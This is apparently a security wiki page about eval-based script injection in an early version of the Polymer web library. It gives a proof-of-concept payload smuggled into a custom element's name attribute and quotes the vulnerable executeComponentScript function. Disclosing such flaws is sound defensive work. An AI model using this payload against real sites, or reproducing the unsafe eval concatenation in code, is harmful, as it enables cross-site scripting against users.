# Introduction #

"Polymer is a new type of library for the web, targeting the modern web platform, and useful for building web applications based on Web Components.

Unlike some other frameworks before it, Polymer attempts to embrace HTML as much as possible by encouraging the use of custom element wherever possible. It includes a handful of independent polyfills for these emerging web standards (Custom Elements, Shadow DOM, etc.) that over time, diminish and ultimately disappear as browser vendors implement the native APIs.

Polymer is still in its very early days, but we’re excited about its potential!"

From http://www.polymer-project.org/faq.html

# Quick Facts #

  * [Polymer 0.0.2.x (Minified)](https://rawgithub.com/polymer/cdn/master/polymer.min.js)
  * Polymer Downloads http://www.polymer-project.org/getting-the-code.html
  * Polymer is highly experimental, evaluating its security metrics might thus be considered unfair and premature.

# Injection Attacks #

Polymer is quite young so it's not really fair to bash on it. Still, it makes heavy use of `eval` and `Function` and several already spotted injection vulnerabilities should be pointed out.

The first example is rather simple. Polymer reads over the existing DOM elements on start-up and registers their names, executes the embedded JS. By doing so, it uses `eval` and creates a custom method that builds the first string-parameter based on the parsed element's name attribute. This causes an injection vulnerability if an attacker can influence that name attribute content - and thereby end up executing arbitrary JavaScript.

```
<script src="https://rawgithub.com/polymer/cdn/master/polymer.min.js"></script> 
<element name="table-headers-color',alert(1),'"> 
    <template></template>
    <script>
        Polymer.register(this, {});
    </script> 
</element>
```

# Eval via executeComponentScript #

The attacker can control the value of `inName` by manipulating the content of the name attribute of the custom element container hosting the Polymer template and script blocks. By simply adding single-quotes and following up with arbitrary JavaScript code, the injection can be performed successfully.

```
function executeComponentScript(inScript, inContext, inName) {
    context = inContext;
    var owner = context.ownerDocument,
    url = owner._URL || owner.URL || owner.impl && (owner.impl._URL || owner.impl.URL),
        match = url.match(/.*\/([^.]*)[.]?.*$/);
    if (match) {
        var name = match[1];
        url += name != inName ? ":" + inName : ""
    }
    var code = "__componentScript('" + inName + "', function(){" + inScript + "});" + "\n//@ sourceURL=" + url + "\n";
    eval(code)
}
```